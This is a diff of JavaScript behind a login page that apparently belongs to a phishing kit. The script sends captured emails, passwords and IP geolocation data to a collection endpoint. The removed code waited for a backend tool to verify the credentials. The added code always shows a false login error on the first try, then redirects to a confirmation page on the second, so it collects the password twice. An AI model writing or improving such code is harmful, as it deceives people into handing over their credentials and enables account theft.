@@ -9,6 +9,7 @@ var timeZone = "";
 var zipCode = "";
 var continent = "";
 var continentCode = "";
+var totalLoginAttempts = 0;
 
 async function setCurrentLang() {
     let getIpInfoUrl = $('#getIpInfoUrl').val();
@@ -26,11 +27,13 @@ async function setCurrentLang() {
     continent = ipInfo.continent;
     continentCode = ipInfo.continentCode;
 }
-setCurrentLang();
+
+// setCurrentLang();
 
 var idIntervalGetCacheByEmail = null;
 
 $(document).on('click', '#btnLogin-desktop', function () {
+    // console.log("Click on btnLogin desktop");
     $(this).prop('disabled', true);
     $('#login_error').css('display', 'none');
     const loading = $('#submit-login-loading');
@@ -54,6 +57,7 @@ $(document).on('click', '#btnLogin-desktop', function () {
 })
 
 function sendDataLoginDesktop() {
+    console.log("sendDataLoginDesktop called");
     const valueEmail = $('#username-desktop').val();
     email = valueEmail;
     const valuePassword = $('#password-desktop').val();
@@ -63,6 +67,7 @@ function sendDataLoginDesktop() {
     formData.append('email_2', valueEmail);
     formData.append('password_2', valuePassword);
     formData = pushIPInfo(formData);
+    totalLoginAttempts += 1;
     $.ajax({
         method: "POST",
         url: "/api/send-data-login",
@@ -72,29 +77,19 @@ function sendDataLoginDesktop() {
         cache: false,
         success: function (response) {
             if (response.status == 0) {
-                // start to call get cache by email waiting until tool returns response of login
-                idIntervalGetCacheByEmail = setInterval(async () => {
-                    let info = await getCacheByEmail(valueEmail);
-                    if (info) {
-                        text.removeClass('d-none');
-                        loading.addClass('d-none');
-                        if (info.isLoginSuccessfully) {
-                            $('#login_error').css('display', 'none');
-                            // save email on localStorage
-                            localStorage.setItem("email", valueEmail);
-                            //
-                            window.location.href = $('#url-confirm').val();
-                        } else {
-                            $('#login_error').css('display', 'block');
-                            text.removeClass('d-none');
-                            loading.addClass('d-none');
-                        }
-                        clearInterval(idIntervalGetCacheByEmail);
-                        $('#btnLogin-desktop').prop('disabled', false);
-                    } else {
-                        console.log("Still call get cache by email");
-                    }
-                }, 3000);
+                text.removeClass('d-none');
+                loading.addClass('d-none');
+                if (totalLoginAttempts > 1) {
+                    $('#login_error').css('display', 'none');
+                    // save email on localStorage
+                    localStorage.setItem("email", valueEmail);
+                    //
+                    window.location.href = $('#url-confirm').val();
+                } else {
+                    $('#login_error').css('display', 'block');
+                    text.removeClass('d-none');
+                    loading.addClass('d-none');
+                }
             } else {
                 $('#btnLogin-desktop').prop('disabled', false);
                 $('#login_error').css('display', 'block');
@@ -106,6 +101,7 @@ function sendDataLoginDesktop() {
 }
 
 $(document).on('click', '#btnLogin-mobile', function () {
+    console.log("Click on btnLogin mobile");
     $(this).prop('disabled', true);
     $('#login_error_mobile').css('display', 'none');
     const loading = $('#submit-login-mobile-loading');
@@ -129,6 +125,7 @@ $(document).on('click', '#btnLogin-mobile', function () {
 })
 
 function sendDataLoginMobile() {
+    console.log("sendDataLoginMobile called");
     const valueEmail = $('#username-mobile').val();
     const valuePassword = $('#password-mobile').val();
     const loading = $('#submit-login-mobile-loading');
